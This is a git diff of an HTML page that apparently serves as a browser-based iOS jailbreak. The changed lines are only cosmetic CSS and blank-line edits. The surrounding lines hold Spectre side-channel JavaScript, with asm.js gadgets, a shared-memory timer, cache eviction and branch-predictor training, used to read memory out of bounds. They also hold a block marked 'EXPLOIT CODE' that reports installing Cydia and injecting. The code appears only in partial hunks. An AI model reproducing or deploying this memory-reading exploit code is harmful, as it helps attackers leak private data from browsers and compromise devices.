@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <script src="jailbreak.js"></script>
@@ -10,8 +9,7 @@
 	body {
    font-family: "HelveticaNeue-Light", "Helvetica Neue Light", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
    font-weight: 300;
-
-   background: linear-gradient(141deg, #000000, #4b0000, #4b0000, #830000, #b40000, #db0000	);
+   background: linear-gradient(141deg, #040c0e, #132226, #525b56, #be9063, #a4978e);
     color:white;
     opacity:0.8;
     background-repeat: no-repeat;
@@ -45,7 +43,6 @@ background-image:url("assets/Button.png");
 	opacity: 1;
 	box-shadow: 0px 0px 3px #000000;
 	border-radius: 500px;
-
 }
 .buttontext {
 padding-top: 10px;
@@ -105,10 +102,8 @@ LOG:<br />
 </center>
 </body>
 <script>
-
 // WORKER
 function worker_function(){
-
 self.onmessage = function(event)
 {
     const sharedBuffer = event.data;
@@ -120,21 +115,17 @@ self.onmessage = function(event)
     }
 };
 }
-
 if(window!=self)
   worker_function();
 // WORKER
-
 // SPECTRE CODE USED TO SCAN MEMORY ARRAYS
 // kudos to: http://xlab.tencent.com/special/spectre/spectre_check.html
 // simplified less reliable version
-
 function log(msg)
 {
 	console.log(msg);
 	document.getElementById('logbox').textContent += msg + "\r\n";
 }
-
 function asmModule(stdlib,forgein,heap)
 {
     'use asm'
@@ -143,7 +134,6 @@ function asmModule(stdlib,forgein,heap)
     const TABLE1_BYTES = 0x2000000;
     const sizeArrayStart = 0x1000000;
     var junk = 0;
-
     function init()
     {
         var i =0;
@@ -155,7 +145,6 @@ function asmModule(stdlib,forgein,heap)
             simpleByteArray[(j|0)] = 16; // simpleByteArrayLength
         }
     }
-
     function vul_call(index, sIndex)
     {
         index = index |0;
@@ -174,10 +163,8 @@ function asmModule(stdlib,forgein,heap)
             junk = (junk ^ (probeTable[index]|0))|0;
         }
     }
-
     return { vul_call: vul_call, init: init };
 }
-
 function check(data_array)
 {
     function now() { return Atomics.load(sharedArray, 0) }
@@ -191,28 +178,22 @@ function check(data_array)
             current = evictionView.getUint32(i * offset);
         }
     }
-
     // start thread counter
 //    const worker = new Worker('timer.js');
     const worker = new Worker(URL.createObjectURL(new Blob(["(" + worker_function.toString() + ")()"], {type: 'text/javascript'})));
     const sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
     const sharedArray = new Uint32Array(sharedBuffer);
     worker.postMessage(sharedBuffer);
-
     var simpleByteArrayLength =  16;
     const TABLE1_BYTES = 0x3000000;
     const CACHE_HIT_THRESHOLD = 0
     var probeTable = new Uint8Array(TABLE1_BYTES);
-
     // eviction buffer (fill LLC)
     var cache_size = CACHE_SIZE * 1024 * 1024;
     var evictionBuffer = new ArrayBuffer(cache_size);
     var evictionView = new DataView(evictionBuffer);
-
     clflush(cache_size); // because of lazy compilation?
-
     var asm = asmModule(this, {}, probeTable.buffer)
-
     worker.onmessage = function(msg)
     {
         function readMemoryByte(malicious_x)
@@ -230,7 +211,6 @@ function check(data_array)
                 junk = simpleByteArray[0];
                 var time4 = now();
                 junk ^= time4 - time3;
-
                 // train branch predictor? (every 4 good indexes uses one malicious, repeat 8 times)
                 for (var j = 1; j < 33; j++)
                 {
@@ -241,7 +221,6 @@ function check(data_array)
                     x = training_x ^ (x & (malicious_x ^ training_x));
                     asm.vul_call(x, j); // x = index to read, j = iteration for fresh size value
                 }
-
                 // measure time of all possible offsets
                 for (var i = 0; i < 256; i++)
                 {
@@ -254,20 +233,16 @@ function check(data_array)
                     }
                 }
             }
-
             // select majority vote
             var max = -1;
             for (var i = 0; i < 256; i++)
             {
                 max = (max > results[i]) ? max : i;
             }
-
             results[256] ^= junk; // reuse to avoid optimization?
             return max;
         }
-
         asm.init();
-
         // set data to read "out-of-bounds"
         const BOUNDARY = 0x2200000;
         var simpleByteArray = new Uint8Array(probeTable.buffer);
@@ -288,10 +263,8 @@ function check(data_array)
         return;
     }
 }
-
 const CACHE_SIZE = 2;
 const MEMORY_SIZE = 10;
-
 function main()
 {
     console.log("main::start");
@@ -310,9 +283,7 @@ function main()
 }
 </script>
 <script>
-
 	document.getElementById('logbox').innerText += '\r\n' + navigator.userAgent + '\r\n';
-
   // EXPLOIT CODE
 function go() {
 document.getElementById('status').innerText = '(Installing Cydia)';
@@ -341,7 +312,6 @@ function kext() {
 		//setTimeout(respring, 16666);
 	document.getElementById('status').innerText = '(Injected)';
 	document.getElementById("Goer").innerText = 'Jailbreaking';
-
 }
 </script>
 </html>
